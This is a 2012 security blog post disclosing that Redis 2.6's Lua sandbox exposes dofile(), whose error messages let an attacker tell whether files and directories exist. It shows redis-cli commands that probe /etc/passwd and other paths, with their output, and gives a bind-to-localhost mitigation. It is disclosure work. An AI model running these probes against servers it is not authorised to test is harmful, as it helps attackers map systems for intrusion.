---
date: 2012-11-14 18:34:00 GMT
slug: filesystem-enumeration-using-redis-and-lua
tumblr_post_url: http://blog.liftsecurity.io/post/35714931664/filesystem-enumeration-using-redis-and-lua
tags: redis, lua, security
title: Filesystem Enumeration using Redis and Lua
type: text
---

[Redis 2.6][0] was recently released by [Antirez][1] at the end of [RedisConf][2]. One of the major features that comes with 2.6 is embedded [Lua scripting][3].   
  
Even though the Lua sandbox within Redis has been very locked down to only the base library and a [few others][4], we have found at least one way to abuse Lua to get some data from outside the sandbox.  
  
There is a function to load and execute a file called dofile()  
  
Given the fact that Lua scripts should perform atomically, this function shouldn't actually exist in the sandbox. We have a pending [pull request][5] to remove this function.  
  
The errors this function gives allow an attacker to determine if a file or directory exists or not. This might be useful in locating a web root or determining the operating system. Not a significant vulnerability in and of itself, but gives information to an attacker they would not otherwise have.  
  
When a file doesn't exist we get a very obvious "No such file or directory error"  
  
net read 127.0.0.1:6379 id 1: -ERR Error running script (call to f\_b5e5869caf1de9ffa1ae173bf46fef3024d3f987): cannot open /dev/a: **No such file or directory**   
  
  
Here is an example of how to do this enumeration from a shell.

    $ redis-cli -h localhost -p 6379 eval "dofile('/etc/passwd')" 0

(error) ERR Error running script (call to f\_afdc51b5f9e34eced5fae459fc1d856af181aaf1): /etc/passwd:2: unexpected symbol near '\#'

    $ redis-cli -h localhost -p 6379 eval "dofile('/tmp')" 0

(error) ERR Error running script (call to f\_70391feea8a62e239b3055c11b7d9d1d8c78db6e): cannot read /tmp: **Is a directory**

    $ redis-cli -h localhost -p 6379 eval "dofile('/doesnotexist')" 0

(error) ERR Error running script (call to f\_e84ccf03dc6b3547568096467afa7b3242ed108d): cannot open /doesnotexist: **No such file or directory**   
  
Conclusion for penetration testers:  
Keep an eye out for Redis servers on the network during your assessments   
  
Conclusion for everyone else:  
Keep your Redis server off the Internet by setting "bind 127.0.0.1" in the redis.conf file.   
  


[0]: http://redis.io/
[1]: https://twitter.com/antirez
[2]: http://redisconf.com
[3]: http://redis.io/commands/eval
[4]: https://gist.github.com/3924845
[5]: https://github.com/antirez/redis/pull/732